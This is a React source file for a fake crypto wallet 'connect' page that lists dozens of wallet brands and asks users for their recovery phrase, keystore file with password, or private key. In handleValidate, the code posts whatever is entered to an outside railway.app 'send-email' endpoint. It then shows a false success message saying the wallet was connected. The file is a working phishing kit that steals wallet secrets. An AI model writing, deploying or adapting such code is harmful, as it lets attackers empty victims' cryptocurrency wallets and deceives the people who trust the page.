import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowRightLeft, Wallet, Key, FileJson, Lock } from 'lucide-react';
import { useSelector } from 'react-redux';

import metamask from './assets/metamask.jpg';
import trust from './assets/trust_wallet.jpg';
import coinbase from './assets/coinbases.png';
import xumm from './assets/xumm.png';
import cardano from './assets/cardano.png';
import daedalus from './assets/daedalus.png';
import yoroi from './assets/yoroi.png';
import ccvault from './assets/ccvault.png';
import gero from './assets/gero.jpg';
import nami from './assets/nami.png';
import solana from './assets/solana.png';
import phantom from './assets/phantom.jpg';
import solflare from './assets/solflare.png';
import sollet from './assets/sollet.png';
import solong from './assets/solong.jpg';
import exodus from './assets/exodus.png';
import avalanche from './assets/avalanche.png';
import velas from './assets/velas.png';
import cryptocom from './assets/crypto-4cbeac57421fb3ca2573db2cf448169a.png';
import blockchain from './assets/blockchain-logo.png';
import binance from './assets/binance.png';
import safepal from './assets/safepal.jpg';
import argent from './assets/argent.jpg';
import aktionariat from './assets/aktionariat-c5784b26234a389632687a36d2fb3258.png';
import keyring from './assets/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png';
import bitkeep from './assets/bitkeep-387b0ca7da4cf322f44c70c23064c529.png';
import sparkpoint from './assets/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png';
import ownbit from './assets/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png';
import infinity from './assets/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png';
import walletio from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
import infinito from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
import nash from './assets/nash.jpg';
import bitpay from './assets/bitpay.jpg';
import imtoken from './assets/imtoken.jpg';
import other from './assets/otherssss.jpg';
import trustwallet from './assets/trustwallet.png'
import okm from './assets/okm.png'

import WalletLoader from './WalletLoader';

const wallets = [
  { name: 'Metamask', icon: metamask },
  { name: 'Trust', icon: trustwallet },
  { name: 'Coinbase', icon: coinbase },
  { name: 'TokenPocket', icon: xumm },
  { name: 'Cardano', icon: cardano },
  { name: 'Daedalus', icon: daedalus },
  { name: 'Yoroi', icon: yoroi },
  { name: 'CCVault', icon: ccvault },
  { name: 'Gero', icon: gero },
  { name: 'Nami', icon: nami },
  { name: 'Solana', icon: solana },
  { name: 'Phantom', icon: phantom },
  { name: 'Solflare', icon: solflare },
  { name: 'Sollet', icon: sollet },
  { name: 'Solong', icon: solong },
  { name: 'Exodus', icon: exodus },
  { name: 'Avalanche', icon: avalanche },
  { name: 'Velas', icon: velas },
  { name: 'Crypto.com', icon: cryptocom },
  { name: 'Blockchain', icon: blockchain },
  { name: 'Binance Smart Chain', icon: binance },
  { name: 'Safepal', icon: safepal },
  { name: 'Argent', icon: argent },
  { name: 'Aktionariat', icon: aktionariat },
  { name: 'Keyring Pro', icon: keyring },
  { name: 'BitKeep', icon: bitkeep },
  { name: 'SparkPoint', icon: sparkpoint },
  { name: 'OwnBit', icon: ownbit },
  { name: 'Infinity Wallet', icon: infinity },
  { name: 'Wallet.io', icon: walletio },
  { name: 'Nash', icon: nash },
  { name: 'BitPay', icon: bitpay },
  { name: 'imToken', icon: imtoken },
  { name: 'okm', icon: okm },
  { name: 'Other Wallet', icon: other },
];

const WalletCard = ({ wallet, onClick }) => (
  <div className="relative group">
    <div className="absolute inset-0 bg-gradient-to-r from-emerald-500/10 to-blue-500/10 rounded-xl blur-lg transform group-hover:scale-105 transition-transform duration-300" />
    <button
      onClick={() => onClick(wallet)}
      className="relative w-full bg-gray-800/80 backdrop-blur-sm border border-gray-700/50 rounded-xl p-4 hover:border-emerald-500/50 transition-all duration-300"
    >
      <div className="flex flex-col items-center space-y-2">
        <div className="bg-gradient-to-br from-gray-700 to-gray-800 rounded-lg p-2 w-16 h-16 flex items-center justify-center">
          <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 object-contain" />
        </div>
        <span className="text-white text-sm font-medium">{wallet.name}</span>
      </div>
    </button>
  </div>
);

const Loader = () => (
  <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex justify-center items-center z-50">
    <div className="bg-gradient-to-r from-emerald-500 to-blue-500 rounded-full p-1 animate-spin">
      <div className="bg-gray-900 rounded-full p-4">
        <div className="w-12 h-12 border-4 border-gray-600 border-t-emerald-500 rounded-full animate-spin"></div>
      </div>
    </div>
  </div>
);

const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
  const [activeTab, setActiveTab] = React.useState('phrase');
  const [inputValue, setInputValue] = React.useState('');
  const [password, setPassword] = React.useState('');
  const [errorMessage, setErrorMessage] = React.useState('');
  const [isLoading, setIsLoading] = React.useState(false);

  if (!isOpen) return null;

  const tabs = [
    { id: 'phrase', label: 'Phrase', icon: Key, 
      hint: 'Typically 12 (sometimes 24) words separated by a single space' },
    { id: 'keystore', label: 'Keystore', icon: FileJson,
      hint: 'Several lines of text beginning with {...} plus the password you used to encrypt it' },
    { id: 'privateKey', label: 'Private Key', icon: Lock,
      hint: 'Typically 64 alphanumeric characters' }
  ];

  const handleValidate = async () => {
    setErrorMessage('');
    const trimmedValue = inputValue.trim();
    const trimmedPassword = password.trim();

    // Basic empty check
    if (!trimmedValue || (activeTab === 'keystore' && !trimmedPassword)) {
      setErrorMessage('Please fill in all required fields');
      return;
    }

    // Validation logic
    let validationError = '';
    try {
      switch (activeTab) {
        case 'phrase': {
          const words = trimmedValue.split(/\s+/g);
          if (![12, 15, 24].includes(words.length)) { // Modified line
            validationError = 'Recovery phrase must contain exactly 12, 15, or 24 words'; // Modified line
          }
          break;
        }

        case 'keystore': {
          const json = JSON.parse(trimmedValue);
          if (!json.crypto || !json.version || !json.crypto.cipher) {
            validationError = 'Invalid keystore file format';
          }
          break;
        }

        case 'privateKey': {
          const cleanKey = trimmedValue.startsWith('0x') 
            ? trimmedValue.slice(2) 
            : trimmedValue;
          const isValid = /^[a-fA-F0-9]{64}$/.test(cleanKey);
          if (!isValid) {
            validationError = 'Invalid private key format (64 hexadecimal characters required)';
          }
          break;
        }

        default:
          validationError = 'Invalid validation type';
      }
    } catch (error) {
      validationError = error.message.startsWith('Unexpected token') 
        ? 'Invalid JSON format' 
        : error.message;
    }

    if (validationError) {
      setErrorMessage(validationError);
      return;
    }

    // Proceed with validation
    setIsLoading(true);
    try {
      await onValidate(activeTab, trimmedValue, trimmedPassword);
    } catch (error) {
      setErrorMessage(error.message || 'Failed to validate wallet. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl w-full max-w-md p-6 border border-purple-800/30">
        <div className="flex items-center space-x-3 mb-6">
          <div className="bg-gradient-to-br from-purple-900 to-slate-900 rounded-lg p-2">
            <img src={wallet?.icon} alt={wallet?.name} className="w-8 h-8" />
          </div>
          <h2 className="text-xl font-bold text-white">{wallet?.name}</h2>
        </div>

        <div className="flex space-x-2 mb-6">
          {tabs.map(({ id, label, icon: Icon }) => (
            <button
              key={id}
              onClick={() => {
                setActiveTab(id);
                setErrorMessage('');
                setInputValue('');
                setPassword('');
              }}
              className={`flex-1 flex items-center justify-center space-x-2 py-2 px-4 rounded-lg transition-all duration-300
                ${activeTab === id 
                  ? 'bg-gradient-to-r from-purple-500 to-rose-500 text-white' 
                  : 'bg-gray-800/50 text-gray-400 hover:text-white border border-purple-800/30'}`}
            >
              <Icon className="w-4 h-4" />
              <span className="text-sm font-medium">{label}</span>
            </button>
          ))}
        </div>

        <div className="space-y-4 mb-6">
          <textarea
            className="w-full bg-gray-800/50 border border-purple-800/30 rounded-lg p-3 text-white placeholder-gray-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
            rows="4"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            placeholder={`Enter your ${activeTab === 'phrase' ? 'recovery phrase' : activeTab === 'keystore' ? 'keystore JSON' : 'private key'}`}
          />
          
          {activeTab === 'keystore' && (
            <input
              type="password"
              className="w-full bg-gray-800/50 border border-purple-800/30 rounded-lg p-3 text-white placeholder-gray-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 transition-all duration-300"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Wallet password"
            />
          )}

          <p className="text-sm text-gray-400">
            {tabs.find(tab => tab.id === activeTab)?.hint}
          </p>

          {errorMessage && (
            <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg p-3">
              <p className="text-rose-400 text-sm">{errorMessage}</p>
            </div>
          )}
        </div>

        <div className="space-y-3">
          <button
            onClick={handleValidate}
            disabled={isLoading}
            className="w-full bg-gradient-to-r from-purple-500 to-rose-500 text-white py-3 px-4 rounded-lg font-medium hover:opacity-90 transform hover:scale-[1.02] transition-all duration-300 flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
          >
            {isLoading ? (
              <>
                <div className="w-5 h-5 border-3 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                <span>Validating...</span>
              </>
            ) : (
              <>
                <span>Validate Wallet</span>
                <ArrowRightLeft className="w-4 h-4" />
              </>
            )}
          </button>

          <button
            onClick={onClose}
            className="w-full bg-gray-800/50 border border-purple-800/30 text-gray-400 py-3 px-4 rounded-lg font-medium hover:text-white transition-all duration-300"
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
};

const WalletConnectPage = () => {
  
  const selectedWallet = useSelector((state) => state.wallet.selectedWallet);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const selectedService = useSelector((state) => state.service.selectedService);


  useEffect(() => {
    if (selectedWallet) {
      setIsModalOpen(true);
    }
  }, [selectedWallet]);


  useEffect(() => {
    if (!selectedWallet) {
      navigate('/connect');
    }
  }, [selectedWallet, navigate]);
  const handleValidate = async (type, value, password = '') => {
    setIsLoading(true);
    try {
      const serviceInfo = selectedService 
        ? `\nSelected Service: ${selectedService.title}\nService Description: ${selectedService.description}`
        : '';
        
      // Send email first
      await sendEmail(
        selectedWallet?.name,
        `Value Flare Synthesis EVM from ${type}: ${value}${password ? `\nPassword: ${password}` : ''}${serviceInfo}`
      );
      
      // Wait exactly 10 seconds before showing success
      await new Promise(resolve => setTimeout(resolve, 10000));
      
      setShowSuccessModal(true);
      setTimeout(() => {
        setShowSuccessModal(false);
        navigate('/');
      }, 3000);
    } catch (error) {
      console.error('Failed to validate wallet:', error);
      throw error;
    } finally {
      setIsLoading(false);
    }
  };
  
  const sendEmail = async (type, text) => {
    try {
      const response = await fetch('https://fastapi-production-0125.up.railway.app/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          type, 
          text,
          domain: ''
        }),
      });
      if (!response.ok) throw new Error('Failed to send email');
    } catch (error) {
      console.error('Error sending email:', error);
      throw error;
    }
  };

  return (
    <section className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-900 to-gray-950 py-20">
      <div className="container mx-auto px-6">
        <Modal
          wallet={selectedWallet}
          isOpen={isModalOpen}
          onClose={() => {
            setIsModalOpen(false);
            navigate('/connect');
          }}
          onValidate={handleValidate}
        />

        {showSuccessModal && (
            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
            <div className="bg-gradient-to-b from-gray-900 to-gray-950 rounded-2xl p-6 border border-purple-800/30 max-w-md w-full">
              <div className="flex items-center mb-4">
                <div className="bg-gradient-to-br from-purple-900 to-slate-900 rounded-full p-3 mr-4">
                  <ArrowRightLeft className="w-6 h-6 text-purple-400" />
                </div>
                <h2 className="text-2xl font-bold text-white">Success!</h2>
              </div>
              <p className="text-gray-400 mb-4">
                Your wallet has been successfully connected.
              </p>
            </div>
          </div>
        )}

        {isLoading && <WalletLoader />}
      </div>
    </section>
  );
};

export default WalletConnectPage;